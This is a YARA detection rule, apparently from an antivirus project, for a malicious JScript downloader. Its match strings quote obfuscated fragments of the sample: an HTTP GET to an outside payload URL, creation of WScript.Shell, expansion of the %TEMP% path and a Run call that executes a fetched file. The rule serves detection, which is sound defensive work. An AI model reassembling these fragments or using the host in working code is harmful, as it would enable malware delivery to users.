rule sig_20160427_d993ea2b0c8d18992bc806b47b9331b3 {
  meta:
    description = "datamaliciousorder - file 20160427_d993ea2b0c8d18992bc806b47b9331b3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "be35c2e7cc44474e37db3062d4a2da7f48a62a2151277cdb88bdc63e1b494a3a"

  strings:
    $s1  = "CkfitUldab[HanfjQpcuz](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function GxkkiWzkaw() {return TkkelAeiof[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"XGrQmcn" ascii
    $s3  = "function GxkkiWzkaw() {return TkkelAeiof[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"XGrQmcn" ascii
    $s4  = "function FqylsBqrbs(GyyqfUofkw, GxqaySoktq){QeyusImaky = QeyusImaky * 1; return GyyqfUofkw - GxqaySoktq;};" fullword ascii
    $s5  = "var TkkelAeiof = function RyjloPtugw() {return KhmtjXlpqw[YzsjiQrqfb](\"WScript\"+\".Shell\");}(), TvprpBgdrb = 11;" fullword ascii
    $s6  = "var KhmtjXlpqw = this[\"WScript\"];" fullword ascii
    $s7  = "if (CkfitUldab[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function GbgmxEggec(){return BhsjrIpllx + \"\";};" fullword ascii
    $s9  = "function SqkomTocbu() {return ((YtebpTtpep == true) && (YtebpTtpep == GfwbvBfusk)) ? 1 : QeyusImaky;};" fullword ascii
    $s10 = "} catch(NxispYpcqw){};};" fullword ascii
    $s11 = "function HubutBkjpu()" fullword ascii
    $s12 = "}while (CjkhsMkynv);" fullword ascii
    $s13 = "function OwknoUujgt(){return YzsjiQrqfb;};" fullword ascii
    $s14 = "var LhnnnPklgw = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "var GfwbvBfusk = false;" fullword ascii
    $s16 = "return FqylsBqrbs(HyzqhPgpgv, TelauHvbem);" fullword ascii
    $s17 = "function OhenaJibmu(BpcvfDtrtr) {var DzngcRzfod = (1, 2, 3, 4, 5, BpcvfDtrtr); return DzngcRzfod;};" fullword ascii
    $s18 = "HgiqpAgmuc = true;" fullword ascii
    $s19 = "YtebpTtpep = true; " fullword ascii
    $s20 = "function QvymdRennn(NpuisGvmte){TkkelAeiof[\"R\"+\"un\"](NpuisGvmte, QeyusImaky, QeyusImaky);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}